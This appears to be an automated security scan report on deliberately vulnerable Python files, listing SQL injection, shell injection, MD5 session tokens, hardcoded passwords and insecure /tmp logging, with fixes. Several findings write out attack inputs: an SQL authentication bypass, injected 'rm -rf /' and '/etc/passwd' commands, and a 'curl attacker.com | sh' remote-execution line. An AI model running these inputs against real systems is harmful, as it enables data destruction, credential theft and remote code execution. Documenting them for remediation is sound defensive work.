# MIIPE Local Scan Report

- Scan: `63271e06-ba2e-4b07-a12b-efc16ac843f2`
- Commit: `1d83c1bb163b1cf3cc130ea8164956d8e444ab6e`
- Status: completed
- Generated: 2026-09-21T19:38:01.803164+00:00
- Findings: 38

## Coverage

- Scanners: bandit unknown
- Files scanned: 0
- Files not scanned: 0

## Security Review

### 1. SQL injection via string interpolation in login_user(). The query is built by directly embedding the 'username' and 'password' parameters into an f-string SQL statement. An attacker can supply a value such as `' OR '1'='1` to bypass authentication entirely or exfiltrate arbitrary data.

- Severity: warning
- Status: open
- Location: `app.py:11`
- CWE: CWE-89
- Validation: needs_review

SQL injection via string interpolation in login_user(). The query is built by directly embedding the 'username' and 'password' parameters into an f-string SQL statement. An attacker can supply a value such as `' OR '1'='1` to bypass authentication entirely or exfiltrate arbitrary data.

**Triage:** The query string is constructed with f-string interpolation of raw function parameters (username, password) with no sanitisation, escaping, or parameterisation. This is a textbook SQL injection pattern. The scanner was unavailable so no scanner finding exists; this is an agent-found issue.

**Recommendation:** Replace string interpolation with parameterised queries: `cursor.execute('SELECT id, username FROM users WHERE username = ? AND password = ?', (username, password))`. Never concatenate or interpolate user-controlled values into SQL strings.

**Citations:**
- `org_protocols: none`: “No security-protocol or security-standard KB documents were found for this organisation. Finding is reported on the basis of agent semantic analysis and CWE-89 (Improper Neutralisation of Special Elements used in an SQL Command).”

### 2. OS command injection via shell=True in fetch_remote_url(). The user-supplied 'user_input' value is interpolated directly into a shell command string and executed with `subprocess.run(..., shell=True)`. An attacker can inject arbitrary shell commands (e.g. `; rm -rf /` or backtick subshells) through the URL argument.

- Severity: warning
- Status: open
- Location: `app.py:21`
- CWE: CWE-78
- Validation: needs_review

OS command injection via shell=True in fetch_remote_url(). The user-supplied 'user_input' value is interpolated directly into a shell command string and executed with `subprocess.run(..., shell=True)`. An attacker can inject arbitrary shell commands (e.g. `; rm -rf /` or backtick subshells) through the URL argument.

**Triage:** The command string is built with an f-string embedding the raw 'user_input' parameter, then executed with shell=True. This allows shell metacharacter injection. The scanner was unavailable; agent-found issue.

**Recommendation:** Never pass shell=True with user-controlled input. Use a list-form invocation: `subprocess.run(['curl', '-fsSL', user_input, '-o', '/tmp/user_data.txt'], shell=False, check=True)`. Additionally, validate and allowlist the URL scheme and host before passing it to any subprocess.

**Citations:**
- `org_protocols: none`: “No security-protocol or security-standard KB documents were found for this organisation. Finding is reported on the basis of agent semantic analysis and CWE-78 (Improper Neutralisation of Special Elements used in an OS Command).”

### 3. Weak cryptographic algorithm (MD5) used for session token generation in create_session_token(). MD5 is cryptographically broken, collision-prone, and trivially reversible via rainbow tables. Using it to derive session tokens makes those tokens predictable and forgeable.

- Severity: warning
- Status: open
- Location: `app.py:26`
- CWE: CWE-327
- Validation: needs_review

Weak cryptographic algorithm (MD5) used for session token generation in create_session_token(). MD5 is cryptographically broken, collision-prone, and trivially reversible via rainbow tables. Using it to derive session tokens makes those tokens predictable and forgeable.

**Triage:** hashlib.md5() is called to produce a session token. MD5 is a broken algorithm for security use. The scanner was unavailable; agent-found issue.

**Recommendation:** Use a cryptographically secure token generator such as `secrets.token_hex(32)` for session tokens. If a hash is required, use SHA-256 or SHA-3 at minimum. Never use MD5 or SHA-1 for security-sensitive purposes.

**Citations:**
- `org_protocols: none`: “No security-protocol or security-standard KB documents were found for this organisation. Finding is reported on the basis of agent semantic analysis and CWE-327 (Use of a Broken or Risky Cryptographic Algorithm).”

### 4. OS command injection via os.system() in remove_user(). The 'user_name' parameter is interpolated directly into a shell command string passed to os.system(). An attacker controlling 'user_name' can inject shell metacharacters (e.g. `; cat /etc/passwd`) or path-traversal sequences (e.g. `../../etc`) to execute arbitrary commands or delete unintended files.

- Severity: warning
- Status: open
- Location: `app.py:31`
- CWE: CWE-78
- Validation: needs_review

OS command injection via os.system() in remove_user(). The 'user_name' parameter is interpolated directly into a shell command string passed to os.system(). An attacker controlling 'user_name' can inject shell metacharacters (e.g. `; cat /etc/passwd`) or path-traversal sequences (e.g. `../../etc`) to execute arbitrary commands or delete unintended files.

**Triage:** os.system() is called with an f-string embedding the raw 'user_name' parameter. This is a direct OS command injection vector. The scanner was unavailable; agent-found issue.

**Recommendation:** Replace os.system() with `shutil.rmtree()` or `os.remove()` operating on a validated, canonicalised path. Verify the resolved path is within the expected directory before deletion. Never pass user-controlled strings to os.system().

**Citations:**
- `org_protocols: none`: “No security-protocol or security-standard KB documents were found for this organisation. Finding is reported on the basis of agent semantic analysis and CWE-78 (Improper Neutralisation of Special Elements used in an OS Command).”

### 5. Hardcoded credential in source code. ADMIN_PASSWORD is assigned the literal string 'admin123' at module level. This credential is committed to version control, visible to anyone with repository access, and trivially guessable. It is also used directly in the __main__ block to call login_user(), meaning it is exercised at runtime.

- Severity: warning
- Status: open
- Location: `app.py:6`
- CWE: CWE-798
- Validation: needs_review

Hardcoded credential in source code. ADMIN_PASSWORD is assigned the literal string 'admin123' at module level. This credential is committed to version control, visible to anyone with repository access, and trivially guessable. It is also used directly in the __main__ block to call login_user(), meaning it is exercised at runtime.

**Triage:** The literal string 'admin123' is assigned to ADMIN_PASSWORD at line 6 and used at line 38. This is a hardcoded credential in version-controlled source. The scanner was unavailable; agent-found issue.

**Recommendation:** Remove all hardcoded credentials from source code. Load secrets from environment variables (os.environ) or a secrets manager (e.g. AWS Secrets Manager, HashiCorp Vault). Rotate the exposed credential immediately.

**Citations:**
- `org_protocols: none`: “No security-protocol or security-standard KB documents were found for this organisation. Finding is reported on the basis of agent semantic analysis and CWE-798 (Use of Hard-coded Credentials).”

### 6. Authentication bypass risk: login_user() returns raw database rows but performs no authorisation check on the result. The caller receives whatever rows the (injectable) query returns and there is no check that the result is non-empty, that the returned user is active/non-locked, or that the password is verified against a stored hash. Combined with the SQL injection at line 11-15, an attacker can bypass authentication entirely without knowing any valid password.

- Severity: warning
- Status: open
- Location: `app.py:9`
- CWE: CWE-306
- Validation: needs_review

Authentication bypass risk: login_user() returns raw database rows but performs no authorisation check on the result. The caller receives whatever rows the (injectable) query returns and there is no check that the result is non-empty, that the returned user is active/non-locked, or that the password is verified against a stored hash. Combined with the SQL injection at line 11-15, an attacker can bypass authentication entirely without knowing any valid password.

**Triage:** The function returns raw rows with no post-query authorisation logic. The SQL injection vulnerability means the WHERE clause can be trivially bypassed. No access-control check exists between the query result and the caller. Agent-found A01 issue.

**Recommendation:** Enforce authentication at the application layer: (1) use parameterised queries, (2) store passwords as bcrypt/argon2 hashes and verify with a constant-time comparison, (3) check that exactly one row is returned and that the account is in an active state before granting access, (4) implement account lockout after repeated failures.

**Citations:**
- `org_protocols: none`: “No security-protocol or security-standard KB documents were found for this organisation. Finding is reported on the basis of agent semantic analysis and CWE-306 (Missing Authentication for Critical Function).”

### 7. SQL injection via string interpolation in login_user() (owasp_violation_push.py). Identical pattern to app.py: username and password are interpolated directly into an f-string SQL query with no parameterisation. An attacker can bypass authentication or exfiltrate data.

- Severity: warning
- Status: open
- Location: `owasp_violation_push.py:18`
- CWE: CWE-89
- Validation: needs_review

SQL injection via string interpolation in login_user() (owasp_violation_push.py). Identical pattern to app.py: username and password are interpolated directly into an f-string SQL query with no parameterisation. An attacker can bypass authentication or exfiltrate data.

**Triage:** Identical SQL injection pattern to app.py. Raw f-string interpolation of function parameters into a SQL query. The scanner was unavailable; agent-found issue.

**Recommendation:** Use parameterised queries: `cursor.execute('SELECT id, username FROM users WHERE username = ? AND password = ?', (username, password))`. Never interpolate user-controlled values into SQL strings.

**Citations:**
- `org_protocols: none`: “No security-protocol or security-standard KB documents were found for this organisation. Finding is reported on the basis of agent semantic analysis and CWE-89 (Improper Neutralisation of Special Elements used in an SQL Command).”

### 8. OS command injection via shell=True in fetch_user_data(). The 'url' parameter is interpolated into a shell command string and executed with subprocess.run(..., shell=True). An attacker controlling the URL can inject arbitrary shell commands.

- Severity: warning
- Status: open
- Location: `owasp_violation_push.py:28`
- CWE: CWE-78
- Validation: needs_review

OS command injection via shell=True in fetch_user_data(). The 'url' parameter is interpolated into a shell command string and executed with subprocess.run(..., shell=True). An attacker controlling the URL can inject arbitrary shell commands.

**Triage:** Identical shell injection pattern to app.py fetch_remote_url(). User-controlled 'url' embedded in f-string command with shell=True. Agent-found issue.

**Recommendation:** Use list-form subprocess invocation with shell=False: `subprocess.run(['curl', '-fsSL', url, '-o', '/tmp/remote_data.txt'], shell=False, check=True)`. Validate and allowlist the URL before use.

**Citations:**
- `org_protocols: none`: “No security-protocol or security-standard KB documents were found for this organisation. Finding is reported on the basis of agent semantic analysis and CWE-78 (Improper Neutralisation of Special Elements used in an OS Command).”

### 9. Weak cryptographic algorithm (MD5) used for session token generation in create_session_token() (owasp_violation_push.py). Identical pattern to app.py: MD5 is cryptographically broken and unsuitable for session tokens.

- Severity: warning
- Status: open
- Location: `owasp_violation_push.py:34`
- CWE: CWE-327
- Validation: needs_review

Weak cryptographic algorithm (MD5) used for session token generation in create_session_token() (owasp_violation_push.py). Identical pattern to app.py: MD5 is cryptographically broken and unsuitable for session tokens.

**Triage:** hashlib.md5() used to produce a session token. Identical broken-crypto pattern to app.py. Agent-found issue.

**Recommendation:** Use `secrets.token_hex(32)` for session tokens. If hashing is required, use SHA-256 or SHA-3.

**Citations:**
- `org_protocols: none`: “No security-protocol or security-standard KB documents were found for this organisation. Finding is reported on the basis of agent semantic analysis and CWE-327 (Use of a Broken or Risky Cryptographic Algorithm).”

### 10. OS command injection via os.system() in delete_temp_files(). The 'username' parameter is interpolated directly into a shell command string passed to os.system(). An attacker can inject shell metacharacters or path-traversal sequences.

- Severity: warning
- Status: open
- Location: `owasp_violation_push.py:39`
- CWE: CWE-78
- Validation: needs_review

OS command injection via os.system() in delete_temp_files(). The 'username' parameter is interpolated directly into a shell command string passed to os.system(). An attacker can inject shell metacharacters or path-traversal sequences.

**Triage:** os.system() called with f-string embedding raw 'username'. Identical OS command injection pattern to app.py remove_user(). Agent-found issue.

**Recommendation:** Replace os.system() with `shutil.rmtree()` or `os.remove()` on a validated, canonicalised path. Confirm the resolved path is within the expected directory before deletion.

**Citations:**
- `org_protocols: none`: “No security-protocol or security-standard KB documents were found for this organisation. Finding is reported on the basis of agent semantic analysis and CWE-78 (Improper Neutralisation of Special Elements used in an OS Command).”

### 11. Hardcoded credential in source code. ADMIN_PASSWORD is assigned the literal string 'admin123' at module level in owasp_violation_push.py, identical to app.py. This credential is committed to version control and trivially guessable.

- Severity: warning
- Status: open
- Location: `owasp_violation_push.py:11`
- CWE: CWE-798
- Validation: needs_review

Hardcoded credential in source code. ADMIN_PASSWORD is assigned the literal string 'admin123' at module level in owasp_violation_push.py, identical to app.py. This credential is committed to version control and trivially guessable.

**Triage:** Literal 'admin123' assigned to ADMIN_PASSWORD at line 11 and used at line 49. Hardcoded credential in version-controlled source. Agent-found issue.

**Recommendation:** Remove all hardcoded credentials. Load secrets from environment variables or a secrets manager. Rotate the exposed credential immediately.

**Citations:**
- `org_protocols: none`: “No security-protocol or security-standard KB documents were found for this organisation. Finding is reported on the basis of agent semantic analysis and CWE-798 (Use of Hard-coded Credentials).”

### 12. Log injection via unsanitised user input in debug_log(). The 'message' parameter is written directly into /tmp/debug.log with no sanitisation. An attacker can inject newlines or control characters to forge log entries, obscure audit trails, or exploit log-parsing tools downstream.

- Severity: warning
- Status: open
- Location: `owasp_violation_push.py:44`
- CWE: CWE-117
- Validation: needs_review

Log injection via unsanitised user input in debug_log(). The 'message' parameter is written directly into /tmp/debug.log with no sanitisation. An attacker can inject newlines or control characters to forge log entries, obscure audit trails, or exploit log-parsing tools downstream.

**Triage:** Raw 'message' parameter written directly to a log file via f-string with no sanitisation. Enables log injection / log forging. Agent-found issue.

**Recommendation:** Sanitise log input by stripping or escaping newline characters (`\n`, `\r`) and other control characters before writing. Use a structured logging library (e.g. Python's `logging` module with a formatter) rather than raw file writes. Avoid logging raw user-controlled data.

**Citations:**
- `org_protocols: none`: “No security-protocol or security-standard KB documents were found for this organisation. Finding is reported on the basis of agent semantic analysis and CWE-117 (Improper Output Neutralisation for Logs).”

### 13. Import of the subprocess module flagged. The module is used in this file with shell=True (lines 24, 38), making the import warning substantive.

- Severity: low
- Status: resolved
- Location: `app.py:4`
- OWASP: A03:2021
- CWE: CWE-78
- Validation: verified

Import of the subprocess module flagged. The module is used in this file with shell=True (lines 24, 38), making the import warning substantive.

**Triage:** Read app.py lines 1-41. The subprocess import is present and the module is used with shell=True at line 24 (B602) and via os.system at line 38 (B605), both with user-controlled input. The import warning is substantive, not a false positive.

**Recommendation:** Remove shell=True and pass arguments as a list to subprocess.run(). Avoid os.system() entirely. Validate and sanitize all user-supplied input before any process invocation.

```
import subprocess
```

### 14. Hardcoded password 'admin123' assigned to module-level constant ADMIN_PASSWORD. This credential is committed to source control and used directly in login_user() at line 41.

- Severity: low
- Status: resolved
- Location: `app.py:6`
- OWASP: A02:2021
- CWE: CWE-259
- Validation: verified

Hardcoded password 'admin123' assigned to module-level constant ADMIN_PASSWORD. This credential is committed to source control and used directly in login_user() at line 41.

**Triage:** Read app.py line 6: `ADMIN_PASSWORD = "admin123"`. The constant is used at line 41 in the __main__ block. This is a genuine hardcoded credential committed to the repository.

**Recommendation:** Remove all hardcoded credentials from source code. Load secrets from environment variables or a secrets manager (e.g., AWS Secrets Manager, HashiCorp Vault) at runtime.

```
ADMIN_PASSWORD = "admin123"
```

### 15. SQL query constructed via f-string interpolation of username and password parameters with no parameterization. Classic SQL injection vector in login_user().

- Severity: medium
- Status: resolved
- Location: `app.py:13`
- OWASP: A03:2021
- CWE: CWE-89
- Validation: verified

SQL query constructed via f-string interpolation of username and password parameters with no parameterization. Classic SQL injection vector in login_user().

**Triage:** Read app.py lines 11-16. The query is built as `f"SELECT id, username FROM users WHERE username = '{username}' AND password = '{password}'"` and passed directly to cursor.execute(). No sanitization or parameterization is present. A payload like `' OR '1'='1` would bypass authentication.

**Recommendation:** Use parameterized queries: cursor.execute('SELECT id, username FROM users WHERE username = ? AND password = ?', (username, password)). Never interpolate user input into SQL strings.

```
        f"SELECT id, username FROM users "
```

### 16. subprocess.run() called with shell=True and a user-controlled URL interpolated directly into the command string in fetch_remote_url(). Arbitrary OS command injection is possible.

- Severity: high
- Status: resolved
- Location: `app.py:24`
- OWASP: A03:2021
- CWE: CWE-78
- Validation: verified

subprocess.run() called with shell=True and a user-controlled URL interpolated directly into the command string in fetch_remote_url(). Arbitrary OS command injection is possible.

**Triage:** Read app.py lines 22-24. `command = f"curl -fsSL {user_input} -o /tmp/user_data.txt"` is passed to subprocess.run(command, shell=True). An attacker supplying `; rm -rf /` as user_input would execute arbitrary shell commands.

**Recommendation:** Pass the command as a list without shell=True: subprocess.run(['curl', '-fsSL', user_input, '-o', '/tmp/user_data.txt'], check=False). Validate the URL against an allowlist of schemes and hosts before use.

```
    subprocess.run(command, shell=True, check=False)
```

### 17. MD5 used to generate session tokens in create_session_token(). MD5 is cryptographically broken and trivially reversible via rainbow tables; it must not be used for security-sensitive tokens.

- Severity: high
- Status: resolved
- Location: `app.py:29`
- OWASP: A02:2021
- CWE: CWE-327
- Validation: verified

MD5 used to generate session tokens in create_session_token(). MD5 is cryptographically broken and trivially reversible via rainbow tables; it must not be used for security-sensitive tokens.

**Triage:** Read app.py line 29: `return hashlib.md5(secret_value.encode('utf-8')).hexdigest()`. The function is named create_session_token, confirming this MD5 digest is used as a security token. MD5 is broken for this purpose.

**Recommendation:** Use secrets.token_hex(32) or secrets.token_urlsafe(32) for session tokens. If hashing is required for other purposes, use SHA-256 or SHA-3 with usedforsecurity=False only for non-security contexts.

```
    return hashlib.md5(secret_value.encode("utf-8")).hexdigest()
```

### 18. Hardcoded /tmp/debug.log path used in write_debug_log(). /tmp is world-writable; a symlink attack could redirect writes to arbitrary files, and log content may be read by any local user.

- Severity: medium
- Status: resolved
- Location: `app.py:33`
- OWASP: A01:2021
- CWE: CWE-377
- Validation: verified

Hardcoded /tmp/debug.log path used in write_debug_log(). /tmp is world-writable; a symlink attack could redirect writes to arbitrary files, and log content may be read by any local user.

**Triage:** Read app.py lines 32-34. `open('/tmp/debug.log', 'a')` is a hardcoded /tmp path. The /tmp directory is world-writable on Linux, enabling symlink attacks and information disclosure to other local users.

**Recommendation:** Use tempfile.mkstemp() or tempfile.TemporaryDirectory() for temporary files. For persistent logs, write to an application-controlled directory with appropriate permissions, not /tmp.

```
    with open("/tmp/debug.log", "a", encoding="utf-8") as handle:
```

### 19. os.system() called with an f-string that interpolates user_name directly into a shell rm -rf command in remove_user(). Arbitrary command injection is possible.

- Severity: high
- Status: resolved
- Location: `app.py:38`
- OWASP: A03:2021
- CWE: CWE-78
- Validation: verified

os.system() called with an f-string that interpolates user_name directly into a shell rm -rf command in remove_user(). Arbitrary command injection is possible.

**Triage:** Read app.py line 38: `os.system(f"rm -rf /tmp/{user_name}")`. A user_name of `; curl attacker.com | sh` would execute arbitrary commands. No sanitization is present.

**Recommendation:** Replace os.system() with shutil.rmtree() after validating that the resolved path is within the expected /tmp directory: use pathlib.Path('/tmp').joinpath(user_name).resolve() and assert it starts with /tmp before deletion.

```
    os.system(f"rm -rf /tmp/{user_name}")
```

### 20. Import of the subprocess module flagged. Used with shell=True at line 15 with user-controlled input.

- Severity: low
- Status: resolved
- Location: `direct_small.py:3`
- OWASP: A03:2021
- CWE: CWE-78
- Validation: verified

Import of the subprocess module flagged. Used with shell=True at line 15 with user-controlled input.

**Triage:** Read direct_small.py. subprocess is imported and used at line 15 with shell=True and a user-controlled URL. The import warning is substantive.

**Recommendation:** Remove shell=True and pass arguments as a list to subprocess.run(). Validate all user-supplied input before any process invocation.

```
import subprocess
```

### 21. Hardcoded password 'admin123' assigned to ADMIN_PASSWORD at module level. Identical credential to app.py, committed to source control.

- Severity: low
- Status: resolved
- Location: `direct_small.py:5`
- OWASP: A02:2021
- CWE: CWE-259
- Validation: verified

Hardcoded password 'admin123' assigned to ADMIN_PASSWORD at module level. Identical credential to app.py, committed to source control.

**Triage:** Read direct_small.py line 5: `ADMIN_PASSWORD = "admin123"`. Genuine hardcoded credential, identical to the one in app.py, committed to the repository.

**Recommendation:** Remove hardcoded credentials. Load from environment variables or a secrets manager at runtime.

```
ADMIN_PASSWORD = "admin123"
```

### 22. SQL query built via %-string formatting of username and password in login_user(). Direct SQL injection vector; no parameterization used.

- Severity: medium
- Status: resolved
- Location: `direct_small.py:9`
- OWASP: A03:2021
- CWE: CWE-89
- Validation: verified

SQL query built via %-string formatting of username and password in login_user(). Direct SQL injection vector; no parameterization used.

**Triage:** Read direct_small.py line 9: `query = "SELECT * FROM users WHERE username='%s' AND password='%s'" % (username, password)`. Classic %-format SQL injection. No parameterization or escaping is present.

**Recommendation:** Use parameterized queries with placeholders (? for sqlite3). Never format user input into SQL strings.

```
    query = "SELECT * FROM users WHERE username='%s' AND password='%s'" % (username, password)
```

### 23. subprocess.run() with shell=True and user-controlled URL interpolated into curl command in fetch_url(). OS command injection is possible.

- Severity: high
- Status: resolved
- Location: `direct_small.py:15`
- OWASP: A03:2021
- CWE: CWE-78
- Validation: verified

subprocess.run() with shell=True and user-controlled URL interpolated into curl command in fetch_url(). OS command injection is possible.

**Triage:** Read direct_small.py lines 13-15. `command = "curl -fsSL %s -o /tmp/result.txt" % url` passed to subprocess.run(command, shell=True). User-controlled url is interpolated directly into a shell command string.

**Recommendation:** Pass command as a list without shell=True: subprocess.run(['curl', '-fsSL', url, '-o', '/tmp/result.txt'], check=False). Validate the URL before use.

```
    subprocess.run(command, shell=True, check=False)
```

### 24. MD5 used for token generation in create_token(). MD5 is cryptographically broken and unsuitable for security tokens.

- Severity: high
- Status: resolved
- Location: `direct_small.py:20`
- OWASP: A02:2021
- CWE: CWE-327
- Validation: verified

MD5 used for token generation in create_token(). MD5 is cryptographically broken and unsuitable for security tokens.

**Triage:** Read direct_small.py line 20: `return hashlib.md5(secret.encode('utf-8')).hexdigest()`. Function is create_token, confirming security use. MD5 is broken for this purpose.

**Recommendation:** Use secrets.token_hex(32) for tokens. If a hash is needed for non-security purposes, use hashlib.sha256() with usedforsecurity=False.

```
    return hashlib.md5(secret.encode("utf-8")).hexdigest()
```

### 25. os.system() called with %-formatted user-controlled name in delete_user(). Shell command injection is possible.

- Severity: high
- Status: resolved
- Location: `direct_small.py:24`
- OWASP: A03:2021
- CWE: CWE-78
- Validation: verified

os.system() called with %-formatted user-controlled name in delete_user(). Shell command injection is possible.

**Triage:** Read direct_small.py line 24: `os.system("rm -rf /tmp/%s" % name)`. User-controlled name is interpolated into a shell rm -rf command with no sanitization.

**Recommendation:** Replace os.system() with shutil.rmtree() after validating the resolved path is within /tmp using pathlib.

```
    os.system("rm -rf /tmp/%s" % name)
```

### 26. Import of the subprocess module flagged. Used with shell=True at line 31 with user-controlled input.

- Severity: low
- Status: resolved
- Location: `owasp_violation_push.py:9`
- OWASP: A03:2021
- CWE: CWE-78
- Validation: verified

Import of the subprocess module flagged. Used with shell=True at line 31 with user-controlled input.

**Triage:** Read owasp_violation_push.py. subprocess is imported and used at line 31 with shell=True and a user-controlled URL. The import warning is substantive.

**Recommendation:** Remove shell=True and pass arguments as a list. Validate all user-supplied input before any process invocation.

```
import subprocess
```

### 27. Hardcoded password 'admin123' assigned to ADMIN_PASSWORD. Third occurrence of this identical credential across the codebase.

- Severity: low
- Status: resolved
- Location: `owasp_violation_push.py:11`
- OWASP: A02:2021
- CWE: CWE-259
- Validation: verified

Hardcoded password 'admin123' assigned to ADMIN_PASSWORD. Third occurrence of this identical credential across the codebase.

**Triage:** Read owasp_violation_push.py line 11: `ADMIN_PASSWORD = "admin123"`. Genuine hardcoded credential, third occurrence across the changed files.

**Recommendation:** Remove hardcoded credentials from all files. Centralise secret loading via environment variables or a secrets manager.

```
ADMIN_PASSWORD = "admin123"
```

### 28. SQL query built via f-string interpolation of username and password in login_user(). SQL injection vector identical to app.py.

- Severity: medium
- Status: resolved
- Location: `owasp_violation_push.py:19`
- OWASP: A03:2021
- CWE: CWE-89
- Validation: verified

SQL query built via f-string interpolation of username and password in login_user(). SQL injection vector identical to app.py.

**Triage:** Read owasp_violation_push.py lines 18-21. f-string SQL construction with raw username and password parameters, no parameterization. Identical pattern to app.py.

**Recommendation:** Use parameterized queries: cursor.execute('SELECT id, username FROM users WHERE username = ? AND password = ?', (username, password)).

```
        f"SELECT id, username FROM users "
```

### 29. subprocess.run() with shell=True and user-controlled URL in fetch_user_data(). OS command injection is possible.

- Severity: high
- Status: resolved
- Location: `owasp_violation_push.py:31`
- OWASP: A03:2021
- CWE: CWE-78
- Validation: verified

subprocess.run() with shell=True and user-controlled URL in fetch_user_data(). OS command injection is possible.

**Triage:** Read owasp_violation_push.py lines 29-31. `command = f"curl -fsSL {url} -o /tmp/remote_data.txt"` passed to subprocess.run(command, shell=True). User-controlled url is interpolated into a shell command.

**Recommendation:** Pass command as a list without shell=True: subprocess.run(['curl', '-fsSL', url, '-o', '/tmp/remote_data.txt'], check=False). Validate the URL against an allowlist.

```
    subprocess.run(command, shell=True, check=False)
```

### 30. MD5 used for session token generation in create_session_token(). MD5 is cryptographically broken.

- Severity: high
- Status: resolved
- Location: `owasp_violation_push.py:37`
- OWASP: A02:2021
- CWE: CWE-327
- Validation: verified

MD5 used for session token generation in create_session_token(). MD5 is cryptographically broken.

**Triage:** Read owasp_violation_push.py line 37: `return hashlib.md5(secret_value.encode('utf-8')).hexdigest()`. Security token generated with broken MD5 algorithm.

**Recommendation:** Use secrets.token_hex(32) or secrets.token_urlsafe(32) for session tokens.

```
    return hashlib.md5(secret_value.encode("utf-8")).hexdigest()
```

### 31. os.system() called with f-string interpolating username directly into rm -rf command in delete_temp_files(). Shell command injection is possible.

- Severity: high
- Status: resolved
- Location: `owasp_violation_push.py:42`
- OWASP: A03:2021
- CWE: CWE-78
- Validation: verified

os.system() called with f-string interpolating username directly into rm -rf command in delete_temp_files(). Shell command injection is possible.

**Triage:** Read owasp_violation_push.py line 42: `os.system(f"rm -rf /tmp/{username}")`. User-controlled username interpolated into a destructive shell command with no sanitization.

**Recommendation:** Replace os.system() with shutil.rmtree() after validating the resolved path is within /tmp using pathlib.Path.resolve().

```
    os.system(f"rm -rf /tmp/{username}")
```

### 32. Hardcoded /tmp/debug.log path in debug_log(). Raw user-controlled message is appended to a world-readable /tmp file, enabling log injection and information disclosure.

- Severity: medium
- Status: resolved
- Location: `owasp_violation_push.py:48`
- OWASP: A01:2021
- CWE: CWE-377
- Validation: verified

Hardcoded /tmp/debug.log path in debug_log(). Raw user-controlled message is appended to a world-readable /tmp file, enabling log injection and information disclosure.

**Triage:** Read owasp_violation_push.py lines 47-49. `open('/tmp/debug.log', 'a')` with raw message written. /tmp is world-readable; any local user can read the log. The message parameter is user-controlled and written verbatim, enabling log injection.

**Recommendation:** Use tempfile.mkstemp() for temporary files. Write application logs to a controlled directory. Sanitize log entries to prevent log injection (strip newlines from message).

```
    with open("/tmp/debug.log", "a", encoding="utf-8") as handle:
```

### 33. Import of the subprocess module flagged. Used with shell=True at line 9 with user-controlled input in run_command().

- Severity: low
- Status: resolved
- Location: `utilities.py:2`
- OWASP: A03:2021
- CWE: CWE-78
- Validation: verified

Import of the subprocess module flagged. Used with shell=True at line 9 with user-controlled input in run_command().

**Triage:** Read utilities.py. subprocess is imported and used at line 9 with shell=True and user-controlled input. The import warning is substantive.

**Recommendation:** Remove shell=True and pass arguments as a list. Validate all user-supplied input before any process invocation.

```
import subprocess
```

### 34. Hardcoded secret key 'super-secret-key' assigned to SECRET_KEY at module level. Committed to source control.

- Severity: low
- Status: resolved
- Location: `utilities.py:4`
- OWASP: A02:2021
- CWE: CWE-259
- Validation: verified

Hardcoded secret key 'super-secret-key' assigned to SECRET_KEY at module level. Committed to source control.

**Triage:** Read utilities.py line 4: `SECRET_KEY = "super-secret-key"`. Genuine hardcoded secret committed to the repository. Must be rotated and removed from source.

**Recommendation:** Load SECRET_KEY from an environment variable (os.environ['SECRET_KEY']) or a secrets manager. Rotate the key immediately as it is now compromised.

```
SECRET_KEY = "super-secret-key"
```

### 35. subprocess.run() with shell=True and user_input interpolated into a bash -lc command in run_command(). Full login-shell command injection is possible, including environment variable expansion.

- Severity: high
- Status: resolved
- Location: `utilities.py:9`
- OWASP: A03:2021
- CWE: CWE-78
- Validation: verified

subprocess.run() with shell=True and user_input interpolated into a bash -lc command in run_command(). Full login-shell command injection is possible, including environment variable expansion.

**Triage:** Read utilities.py lines 7-9. `cmd = f"bash -lc '{user_input}'"` passed to subprocess.run(cmd, shell=True). The bash -lc wrapper makes this especially dangerous: single-quote escaping can be bypassed with `'; malicious_cmd; '`, and a login shell loads the full user environment.

**Recommendation:** Do not wrap user input in bash -lc. If a shell command must be run, use a strict allowlist of permitted commands. Prefer subprocess.run(list_of_args, shell=False).

```
    subprocess.run(cmd, shell=True, check=False)
```

### 36. os.system() called with f-string interpolating folder_name directly into rm -rf in delete_folder(). Shell command injection and path traversal are both possible.

- Severity: high
- Status: resolved
- Location: `utilities.py:19`
- OWASP: A03:2021
- CWE: CWE-78
- Validation: verified

os.system() called with f-string interpolating folder_name directly into rm -rf in delete_folder(). Shell command injection and path traversal are both possible.

**Triage:** Read utilities.py line 19: `os.system(f"rm -rf {folder_name}")`. Unlike app.py and owasp_violation_push.py, this version does NOT prefix /tmp/, making the path traversal risk even broader — any path can be deleted.

**Recommendation:** Replace os.system() with shutil.rmtree() after resolving and validating the path with pathlib.Path.resolve(). Reject paths containing '..' or that resolve outside the expected base directory.

```
    os.system(f"rm -rf {folder_name}")
```

### 37. Hardcoded /tmp/access.log path in log_access(). Authentication tokens are written in plaintext to a world-readable /tmp file.

- Severity: medium
- Status: resolved
- Location: `utilities.py:24`
- OWASP: A01:2021
- CWE: CWE-377
- Validation: verified

Hardcoded /tmp/access.log path in log_access(). Authentication tokens are written in plaintext to a world-readable /tmp file.

**Triage:** Read utilities.py lines 22-25. `open('/tmp/access.log', 'a')` writes `{user_name}:{token}` — authentication tokens in plaintext to /tmp. Any local user can read /tmp/access.log and harvest valid tokens.

**Recommendation:** Write access logs to an application-controlled directory with restricted permissions (chmod 600). Never log authentication tokens in plaintext. Use tempfile APIs for temporary files.

```
    with open("/tmp/access.log", "a", encoding="utf-8") as handle:
```

### 38. The log_access() function writes authentication tokens in plaintext to /tmp/access.log, a world-readable file in a shared directory. Any local user or process on the same host can open /tmp/access.log and harvest valid session tokens, enabling session hijacking. This is an access control failure: the confidentiality of authentication material is not enforced at the filesystem level. The scanner flagged the insecure temp path (B108/SEC-0025) but did not identify the specific broken-access-control consequence of storing authentication tokens there.

- Severity: warning
- Status: resolved
- Location: `utilities.py:22`
- CWE: CWE-732
- Validation: needs_review

The log_access() function writes authentication tokens in plaintext to /tmp/access.log, a world-readable file in a shared directory. Any local user or process on the same host can open /tmp/access.log and harvest valid session tokens, enabling session hijacking. This is an access control failure: the confidentiality of authentication material is not enforced at the filesystem level. The scanner flagged the insecure temp path (B108/SEC-0025) but did not identify the specific broken-access-control consequence of storing authentication tokens there.

**Triage:** Read utilities.py lines 22-25. `log_access(user_name, token)` writes `f"{user_name}:{token}\n"` to `/tmp/access.log`. The token parameter is a raw authentication credential. /tmp is world-readable (mode 1777) on all standard Linux systems. This is a distinct A01 finding from the B108 scanner hit: the scanner flagged the insecure temp path generically; this finding identifies the specific broken-access-control consequence — authentication tokens are readable by any local principal.

**Recommendation:** Never write authentication tokens or session identifiers to log files. If access logging is required, log only non-sensitive identifiers (e.g., a hashed or truncated token reference). Write logs to an application-controlled directory with mode 0600 or 0640, not to /tmp. Consider using the Python logging module with a FileHandler pointed at a restricted path.

**Citations:**
